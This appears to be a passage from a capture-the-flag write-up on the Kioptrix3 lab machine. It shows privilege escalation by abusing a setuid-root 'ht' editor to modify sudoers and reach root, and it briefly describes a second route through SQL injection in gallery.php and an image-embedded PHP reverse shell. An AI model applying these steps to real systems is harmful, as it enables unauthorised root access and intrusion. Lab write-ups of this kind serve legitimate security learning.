I'm in on "loneferret". Navigating by your home directory, we will see a file called "CompanyPolicy.README" with the message:

```
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

As said, the "ht" software (by the way, a good software for editing binaries) apparently can be executed with root privileges.

```bash
loneferret@Kioptrix3:~$ls -lah `which ht`
-rwsr-sr-x 1 root root 2.0M 2011-04-16 07:26 /usr/local/bin/ht
loneferret@Kioptrix3:~$ht
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$export TERM=xterm
```
A setuid flag allows me to run an executable with the permissions of the executable's owner, in this case, root. So, I can take advantage of the ht binary to edit something like a sudoers file (or /etc/shadow, create a cron, so on) to get root on the system.

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/image4_kioptrix3.png)

Adding all privileges to loneferret:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/image5_kioptrix3.png)

Finally, I got root on the system:

```bash
loneferret@Kioptrix3:~$ sudo su
root@Kioptrix3:/home/loneferret# id
uid=0(root) gid=0(root) groups=0(root)
```

### Second solution

There is a SQL injection vulnerability with the Kioptrix3 gallery that can be exploited by the parameter "id" at URI "**gallery/gallery.php?id=1**". 

I can logging in the application with the users discovered by the database and upload a embedded php in an image to invoking a reverse shell to my machine.
